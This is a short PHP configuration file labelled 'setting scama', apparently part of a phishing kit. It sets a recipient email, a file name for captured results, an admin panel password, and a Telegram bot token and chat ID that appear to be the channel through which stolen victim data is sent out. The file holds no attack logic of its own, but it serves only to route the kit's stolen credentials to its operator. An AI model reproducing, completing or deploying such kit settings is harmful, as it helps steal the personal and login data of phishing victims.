<?php
// setting scama
$yourmail  = "";  // your email 
$namerand = "rzlt";  // name for file rzult *
$pass = "123345"; // pass admin panel
$botToken="5445869342:AAFPOtbyjAsWZV2-JHIVm5I-OnebKpLz-io"; // token bot telegram
$chatId="-683793898";  // chatId telegram

?>